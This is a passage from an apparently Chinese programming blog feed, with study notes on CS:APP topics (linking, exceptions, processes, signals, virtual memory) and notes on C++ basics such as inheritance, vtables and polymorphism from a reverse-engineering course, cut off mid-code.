title="1.静态链接"></a>1.静态链接</h2><p>静态链接的过程：首先<code>预处理器cpp</code>将源程序main.c翻译成一个ASCII码的中间文件main.i，接下来<code>编译器ccl</code>将main.i翻译成ASCII码的汇编语言文件main.s，然后<code>汇编器as</code>将main.s翻译成一个可重定位的目标文件main.o，最后运行<code>链接器ld</code>将main.o和其他目标文件组合，创建一个可执行目标文件a.out。最后shell调用可执行目标文件时，shell调用操作系统中一个叫加载器(loader)的函数，它将可执行目标文件中的代码和数据复制到内存，然后将控制转移到这个程序的开头。</p><p><img src="https://i.loli.net/2021/04/29/Yj9wZncSd7BElgV.png" alt="image-20210429224129668"></p><p>每个可重定位目标文件都有一个符号表，符号有：</p><ul><li>由当前可重定位目标文件定义的<code>全局符号</code>，可以被其他模块引用，对应于非静态的函数和全局变量；</li><li>由其它文件定义并被当前文件引用的全局符号，这些符号称为<code>外部符号</code>，对应于在其它模块中定义的非静态函数和全局变量；</li><li>只被当前文件定义和引用的<code>局部符号</code>，它们对应带static的函数和全局变量，这些符号在当前文件中可见，但是不能被其它文件引用。</li></ul><p>特殊的节：</p><ul><li>ABS：不该被重定位的符号</li><li>UNDEF：表示未定义的符号</li><li>COMMON：未初始化的全局变量</li></ul><p><code>.bss</code>段和COMMON的区别是：<code>.bss</code>存的是未初始化的静态变量，以及初始化后为0的全局或静态变量</p><blockquote><p>想要深刻理解，可以去看csapp练习题7.1</p></blockquote><h2 id="2-全局符号"><a href="#2-全局符号" class="headerlink" title="2.全局符号"></a>2.全局符号</h2><p>每个模块定义一组符合，有些只对定义该符号的模块可见，我们称之为<strong>弱符号</strong>，有的是全局的，对其他模块也可见，我们称之为<strong>强符号</strong>。</p><p><img src="https://i.loli.net/2021/05/11/8YhJPOQm7pl21ov.png" alt="image-20210511142703890"></p><h2 id="3-小结"><a href="#3-小结" class="headerlink" title="3.小结"></a>3.小结</h2><ul><li>链接可以在编译时由静态编译器完成，也可以在加载时和运行时由动态链接器完成。</li><li>链接器处理的目标文件有三种形式：可重定位，可执行和共享。</li><li>可重定位文件由静态链接器合并，共享目标文件在运行时由动态链接器链接和加载。</li><li>链接器的两个任务是符号解析和重定位。符号解析将目标文件中的每个全局符号都绑定到一个唯一的定义，而重定位确定每个符号的最终内存地址，并修改对那些目标的引用。</li></ul><h1 id="0x08-异常控制流"><a href="#0x08-异常控制流" class="headerlink" title="0x08 异常控制流"></a>0x08 异常控制流</h1><h2 id="1-异常"><a href="#1-异常" class="headerlink" title="1.异常"></a>1.异常</h2><p><strong>控制流：</strong>处理器从开机到关机，程序计数器都会依次读取一个值，这个值是相应指令的地址。这样持续不断的读取执行的过程，就是处理器的控制流。</p><blockquote><p>目前有两种机制可以改变控制流：</p><ol><li><p>跳转和分支；</p></li><li><p>调用和返回。</p></li></ol><p>但是对于系统来说是不够的，因为某些情况下需要对系统状态改变做出相应。所以就有了异常控制流。</p></blockquote><p><strong>异常控制流（ECF）：</strong>异常控制流发生在操作系统各个层次。</p><blockquote><p>当处理器检测到有事件发生时，它会通过一张叫<code>异常表</code>的跳转表，跳转到处理异常的程序。完成异常处理后，根据异常的类型会发生以下3种情况：</p><ul><li>处理程序将控制返回给当前指令；</li><li>处理程序将控制返回给下一条要执行的指令；</li><li>处理程序中止被中断的程序。</li></ul></blockquote><p><strong>异常表：</strong></p><blockquote><ul><li>每种类型的事件都有唯一的异常号</li><li>发生异常时通过异常号来调用处理程序</li></ul></blockquote><p><strong>异常的类别：</strong></p><table><thead><tr><th>类别</th><th>原因</th><th>异步/同步</th><th>返回行为</th></tr></thead><tbody><tr><td>中断</td><td>来自I/O设备的信号</td><td>异步</td><td>总是返回到下一条指令</td></tr><tr><td>陷阱</td><td>有意的异常</td><td>同步</td><td>总是返回到下一条指令</td></tr><tr><td>故障</td><td>潜在可恢复的错误</td><td>同步</td><td>可能返回到当前指令</td></tr><tr><td>中止</td><td>不可恢复的错误</td><td>同步</td><td>不会返回</td></tr></tbody></table><blockquote><p>异步异常指的是处理器外部的I/O设备中的事件产生的。同步异常是执行一条指令的直接产物。</p></blockquote><p>中断：</p><blockquote><ol><li>定时器中断</li></ol><p>每隔几毫秒，一个外部计时器芯片就会触发一个中断<br>内核用来从用户程序取回控制权</p><ol start="2"><li>来自外部设备的I / O中断</li></ol><p>在键盘上按Ctrl-C<br>来自网络的数据包到达<br>磁盘中的数据到达</p></blockquote><p>陷阱：</p><blockquote><p>陷阱是一种<em>有意</em>的异常，其最重要的用途是在用户程序与内核间提供一个<code>系统调用</code>接口。利用该接口可进行读写文件，加载程序等等。</p></blockquote><p>故障：</p><blockquote><p>故障由错误情况引起，可能能够被故障处理程序修正。如果程序能修正就会重新执行。如果不能修正就会终止程序。</p><p>一个很经典的故障是缺页异常，当指令引用一个虚拟地址，但是与该地址相对应的物理页面不在内存中，因此必须从磁盘中取出，就会发生故障。当程序从磁盘加载出来到内存之后，就可以把控制返回给引起故障的指令。然后指令再次执行即可。</p></blockquote><p>终止：</p><blockquote><p>终止是不可恢复的致命错误造成的，通常是硬件错误。</p><p>当故障不能修正时，会和终止一样返回到abort程序，由该程序终止整个应用程序。</p></blockquote><h2 id="2-进程"><a href="#2-进程" class="headerlink" title="2.进程"></a>2.进程</h2><p><strong>进程</strong>是一个执行中程序的实例。系统中的每个程序都运行在某个进程的上下文。</p><p><strong>上下文</strong>由程序正确运行所需要的状态组成，包括内存中的代码和数据，栈，通用寄存器，程序寄存器，环境变量和文件描述符的集合。</p><blockquote><p>运行程序时，shell就会创建一个新的进程，然后在这个新进程的上下文中运行这个可执行目标文件。</p></blockquote><p>进程给予应用程序一个假象，好像我们的程序可以独占使用处理器和内存系统。</p><ol><li>进程轮流使用处理器，每一个进程执行一部分指令后，就被抢占，轮到其他进程。它们交错执行。这样它看起来就像是在独占地使用处理器。</li><li>如果两个流的执行在时间上重合，称为<strong>并发流</strong>。</li></ol><blockquote><p>多个流并发地执行称为并发</p><p>多个进程轮流运行称为多任务</p><p>一个进程执行它的控制流的一部分的每一时间段叫做时间片，多任务叫做时间分片</p></blockquote><ol start="3"><li>如果两个流并发地运行在不同的处理器或者计算机，我们称它们为<strong>并行流</strong>。</li><li>进程为每个程序提供自己的私有地址空间。</li></ol><p><img src="https://i.loli.net/2021/05/14/L5DmUg6jNwWnoFH.png" alt="image-20210514172622134"></p><ol start="5"><li>内核模式和用户模式</li></ol><blockquote><p>处理器通常用某个控制寄存器中的模式位提供一种功能，就是描述当前进程享有的权限。当设置该模式位时，进程就运行在内核模式中，没有设置，就运行在用户模式中。</p><p>用户模式的进程不允许执行特权指令，比如停止处理器改变模式位，或者发起I/O操作等。</p><p>内核模式可以执行任何指令并且访问任何位置。</p><p>在异常发生时，处理器可以把用户模式变成内核模式。</p></blockquote><p><strong>上下文切换：</strong></p><blockquote><p>内核通过调度器抢占进程。当内核选择一个新进程运行时，我们说内核调度了这个进程。然后使用上下文切换的机制将控制转移给新的进程。</p><p>上下文切换：1.保存当前进程的上下文。2.恢复某个先前被抢占的进程被保存的上下文。3.将控制转移给这个新恢复的进程。</p></blockquote><p><img src="https://i.loli.net/2021/05/14/2ybaoMrT8xjZzPS.png" alt="image-20210514174719024"></p><h2 id="3-进程控制"><a href="#3-进程控制" class="headerlink" title="3.进程控制"></a>3.进程控制</h2><p>进程的三种状态：</p><ul><li>运行：进程要么在CPU上执行，要么等待被执行且最终会被内核调度</li><li>停止：进程的执行被挂起且不会被调度。当收到<code>SIGSTOP</code>、<code>SIGTSTP</code>、<code>SIGTTIN</code>或者<code>SIGTTOU</code>信号时，进程停止，直到它收到<code>SIGCONT</code>信号才会再次运行。</li><li>终止：进程永远停止。进程因为三种原因终止：1.受到信号，该信号的默认行为是终止进程。2.从主程序返回。3.调用<code>exit</code>函数</li></ul><ol><li>父进程通过调用fork函数创建一个新的子进程，子进程可以得到一份和父进程用户级虚拟地址空间的一份副本，包括代码和数据段、堆、共享库以及用户栈。它们最大的区别是有不同的PID。</li><li>fork函数被调用一次，会返回两次。一次是在调用父进程的时候，一次是在新创建子进程的时候。</li><li>子进程fork返回0，父进程fork返回子进程的PID，出错fork返回负值。</li><li>父进程和子进程是并发运行的独立进程</li></ol><p><strong>回收子进程：</strong></p><ul><li>当一个进程终止时，内核并不是立即把它从系统中清除，相反，进程被保持在一种已经终止的状态中，直到它的父进程回收。</li><li>一个终止了但还未被回收的进程称为僵死进程。</li><li>如果父进程在没有回收的情况下终止，则该子进程称为孤儿进程，内核会安排init进程成为该子进程的父进程，并回收该僵尸进程。</li><li>init进程的pid为1，它不会终止，是所有进程的祖先。</li><li>sleep函数会使当前进程休眠。需要注意的是，休眠的进程可能因为一个信号中断而提前返回。</li></ul><p><strong>waitpid：</strong></p><blockquote><p>父进程可以用waitpid等待子进程死亡，也可以用它获得子进程死亡原因。</p><p>waitpid的参数status会自动收集子进程死亡原因，然后回收了所有子进程之后，父进程再调用waitpid就返回-1。</p><p>返回结果：如果函数成功返回子进程的pid，如果WNOHANG返回0，如果其他错误返回-1。</p></blockquote><p>execve函数调用另外一个程序，它会把新程序加载到当前进程的内存空间内，然后丢弃当前的进程。</p><h2 id="4-信号"><a href="#4-信号" class="headerlink" title="4.信号"></a>4.信号</h2><p>信号通知进程系统发生了一个某种类型的事件。</p><p><code>Linux信号</code>是一种更高层的软件形式的异常。它允许进程和内核中断其他进程。</p><p><img src="https://i.loli.net/2021/05/15/f4y2W7ScZJFjxIe.png" alt="image-20210515174747041"></p><p>传送信号到目的进程的步骤：</p><blockquote><ul><li><p>发送信号。内核通过更新目的进程上下文中的某个状态，发送一个信号给目的进程。</p></li><li><p>接收信号。当进程被内核强制对信号的发送做出反应时，它就接收了信号。</p></li></ul><p>进程可以忽略信号，终止或者通过信号处理程序的用户层函数捕获信号。</p></blockquote><p>发出但是没被接收的信号叫做<strong>待处理信号</strong>，一种类型只能有一个待处理信号，剩下的会被丢弃掉。</p><p>每个信号类型都有一个预定义的默认行为：</p><blockquote><ul><li>进程终止</li><li>进程终止并转储内存</li><li>进程停止直到SIGCONT信号重启</li><li>进程忽略该信号</li></ul></blockquote><h1 id="0x09-虚拟内存"><a href="#0x09-虚拟内存" class="headerlink" title="0x09 虚拟内存"></a>0x09 虚拟内存</h1><p><img src="https://i.loli.net/2021/06/07/hDqvAuSc8VIXpwB.png" alt="image-20210607234242291"></p><h2 id="1-物理和虚拟寻址"><a href="#1-物理和虚拟寻址" class="headerlink" title="1.物理和虚拟寻址"></a>1.物理和虚拟寻址</h2><blockquote><ul><li><p>为了方便管理内存并且少出错，现代系统提供了一种对主存的抽象概念，叫做虚拟内存。<strong>它为每个进程提供了一个大的、一致的、私有的地址空间。</strong></p></li><li><p>现代系统通常支持32位和64位的虚拟地址空间，一个包含了2^n的虚拟地址空间就被叫做一个n位地址空间。</p></li><li><p>计算机系统的主存是一个由M个连续的单元组成的数组。每个单元都有一个唯一的物理地址。</p></li><li><p><strong>物理寻址</strong>：早先计算机直接对物理内存的位置进行寻址，这些地址段组成了物理地址空间。</p></li><li><p><strong>虚拟寻址</strong>：现代处理器使用的是<strong>虚拟寻址</strong>，CPU通过生成虚拟地址访问主存，这个虚拟地址在被传送到内存之前会先被转换成物理地址。</p></li><li><p>将一个虚拟地址转换为物理地址的任务叫做<strong>地址翻译</strong>，地址翻译需要CPU硬件和操作系统才能完成。CPU芯片上负责地址翻译的硬件叫做<strong>内存管理单元</strong>，利用存在主存的查询表动态翻译虚拟地址，这个表的内容由操作系统管理。</p></li></ul></blockquote><h2 id="2-页"><a href="#2-页" class="headerlink" title="2.页"></a>2.页</h2><p>虚拟内存被分割成虚拟页，物理内存被分割成物理页。</p><p>物理页装载到虚拟页里运行程序，好处是程序员编程时不需要考虑内存容量的大小。这样的原理是程序员在虚拟空间编写程序，然后程序在真正的内存中运行。</p><p><img src="https://i.loli.net/2021/06/07/I56ydsiBKR1Sn9X.png"></p><p>页表：每次<code>地址翻译硬件</code>将一个虚拟地址转换为物理地址时，都会读取页表，页表描述了虚拟页和物理页框之间的映射关系。操作系统负责维护页表的内容，以及在磁盘和虚拟空间的缓存之间来回传送页。</p><p>内存中存放页的区域叫做页框。</p><p><img src="https://i.loli.net/2021/06/07/aBAVrXeUOs1kKco.png"></p><blockquote><p>上图的进程只有4页，页表对应着虚拟页和主存的页框之间的映射关系。如果我们现在访问虚拟页中第1页的第30个地址，就通过页表访问物理内存的14页的第30个地址。</p></blockquote><p>根据程序的活跃性我们可以把不用的放到磁盘，活跃的放到主存。按照需要调用页。</p>]]></content>
      
      
      <categories>
          
          <category> 2021年2月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向-c++-and-win32</title>
      <link href="/2020/12/17/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c++-and-win32/"/>
      <url>/2020/12/17/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c++-and-win32/</url>
      
        <content type="html"><![CDATA[<h1 id="c"><a href="#c" class="headerlink" title="c++"></a>c++</h1><h2 id="0x00-代码规范"><a href="#0x00-代码规范" class="headerlink" title="0x00 代码规范"></a>0x00 代码规范</h2><ol><li>将定义与实现分离，代码会有更好的可读性</li><li>使用结构体指针</li></ol><h2 id="0x01-this指针"><a href="#0x01-this指针" class="headerlink" title="0x01 this指针"></a>0x01 this指针</h2><p>函数放在结构体里就会出现this指针</p><p>1.为什么要使用结构体指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hello</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果直接调用hello结构，则在内存中会占用8个字节，而使用指针只需要占用4个字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hello* world;</span><br><span class="line">world-&gt;a = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样无法调用构造函数，因为构造函数是在结构体创建的时候才会执行，但指针只是指向一个结构体。</p><p>2.this指针的特点</p><ul><li><strong>它用来指向自己的结构体</strong>，内存中在结构体参数确定时使用ecx来传递。</li><li>不管是否使用，它都会传递进函数。</li><li>this指针不能做运算，不能被重新赋值。</li><li>this指针不占用结构体的宽度</li></ul><br><h2 id="0x02-继承"><a href="#0x02-继承" class="headerlink" title="0x02 继承"></a>0x02 继承</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line"><span class="keyword">int</span> level;</span><br><span class="line"><span class="keyword">int</span> classId;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line"><span class="keyword">int</span> code;</span><br><span class="line"><span class="keyword">int</span> score;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用继承</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">int</span> sex;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span>:</span>Person</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> level;</span><br><span class="line"><span class="keyword">int</span> classId;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>:</span>Person</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> code;</span><br><span class="line"><span class="keyword">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Person t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(t));<span class="comment">//8</span></span><br><span class="line">    Student s;</span><br><span class="line">    s.age = <span class="number">1</span>;</span><br><span class="line">    s.sex = <span class="number">2</span>;</span><br><span class="line">    s.code = <span class="number">3</span>;</span><br><span class="line">    s.score = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(s));<span class="comment">//16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、什么是继承？<br>继承就是数据的复制</p><p>2、为什么要用继承？<br>减少重复代码的编写</p><p>3、Person 称为父类或者基类<br>4、Teacher、Student称为子类或者派生类<br>5、t和s可以称为对象或者实例<br>6、可以用父类指针指向子类的对象<br>7、继承在底层中和普通函数没有区别。（建议看代码理解</p><p><img src="https://i.loli.net/2020/12/17/UW9cMqNV4BRiKas.png" alt="image-20201217210640028"></p><br><h2 id="0x03-include"><a href="#0x03-include" class="headerlink" title="0x03 include"></a>0x03 include</h2><ol><li>xxx.h只是一个文件，可以是任何后缀名，甚至是xxx.exe</li><li><code>#include</code>的作用仅仅是把文件的内容复制过来</li><li>xxx.h和xxx.cpp不一定要求同名</li></ol><br><h2 id="0x04-public-private"><a href="#0x04-public-private" class="headerlink" title="0x04 public private"></a>0x04 public private</h2><ol><li>对外提供的函数或者变量，定义成public的，不能随意改动</li><li>可能会变动的函数或者变量，定义成private。</li><li>父类中的private也会被继承，不过编译器不允许使用，可以通过指针访问使用。</li><li>在底层中，private修饰的成员与普通的成员没有区别，只是编译器会进行检测。</li><li>定义成public或者private底层中没有区别，主要是设计思想。</li></ol><p><strong>可以把父类的程序继承变成private的属性，class的默认继承为private，struct的默认继承为public。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub</span>:</span><span class="keyword">private</span> Base<span class="comment">//class Sub:Base效果一样</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub2</span>:</span><span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> a2;</span><br><span class="line"><span class="keyword">int</span> b2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第二和五点可以延申一下，举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getage</span><span class="params">(<span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age&gt;<span class="number">150</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;年龄太大了&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果直接对age进行赋值的话，如果出现合法但是不合理的值，就会出问题。而定义成私有的可以更加方便合理。</p><br><h2 id="0x05-虚函数表"><a href="#0x05-虚函数表" class="headerlink" title="0x05 虚函数表"></a>0x05 虚函数表</h2><ol><li>通过对象调用时，virtual函数与普通函数都是E8 Call</li><li>通过指针调用时，virtual函数与普通函数都是FF Call</li><li>当类中有虚函数时，会在类的首地址4字节多出一张表，里面存储了所有虚函数的地址</li></ol><p><img src="https://i.loli.net/2020/12/28/h6J4uKfYAk2gXid.png" alt="image-20201228221922888"></p><br><h2 id="0x06-多态"><a href="#0x06-多态" class="headerlink" title="0x06 多态"></a>0x06 多态</h2><p>一种类型能够体现出不同的行为，叫做多态</p><p><strong>绑定：</strong></p><ol><li>虚函数继承<strong>重写</strong>会直接替换虚表里的所有之前的虚函数。</li><li>绑定就是将函数调用与地址关联起来</li><li>如果函数编译完就知道地址，就称其为编译期绑定or前期绑定</li><li>如果只有在运行时才知道地址，就称其为动态绑定or运行期绑定</li><li><strong>只有虚函数是动态绑定的</strong>，动态绑定就是多态</li></ol><p><strong>！！！没有多态，你父类指针只能访问自己的方法，不能访问子类的方法。多态是由虚表实现的。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="function"><span class="keyword">public</span></span></span><br><span class="line"><span class="function"><span class="title">Base</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Function_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Base:Function_1...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Function_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Base:Function_2...virtual\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub</span>:</span><span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Sub</span>()</span><br><span class="line">&#123;</span><br><span class="line">x = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Function_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sub:Function_1...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Function_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sub:Function_2...virtual\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TestBound</span><span class="params">(Base* pb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = pb-&gt;x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,n);</span><br><span class="line"></span><br><span class="line">pb-&gt;<span class="built_in">Function_1</span>();<span class="comment">//函数调用</span></span><br><span class="line"></span><br><span class="line">pb-&gt;<span class="built_in">Function_2</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Base a;</span><br><span class="line">    <span class="built_in">TestBound</span>(a);</span><br><span class="line">    <span class="comment">//64 Base1 Base2</span></span><br><span class="line">Sub b;</span><br><span class="line">    <span class="built_in">TestBound</span>(b);</span><br><span class="line">    <span class="comment">//64 Base1 Sub2</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="0x08-模板"><a href="#0x08-模板" class="headerlink" title="0x08 模板"></a>0x08 模板</h2><p>模板可以替换任何类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;class T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">(T a)</span></span>;</span><br><span class="line"><span class="comment">//hello函数可以接收任何类型的参数</span></span><br></pre></td></tr></table></figure><p>如果需要接收两个不同的类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;class T,class B&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">(T a,B b)</span></span>;</span><br></pre></td></tr></table></figure><p>类中的模板和函数中的模板不一样</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 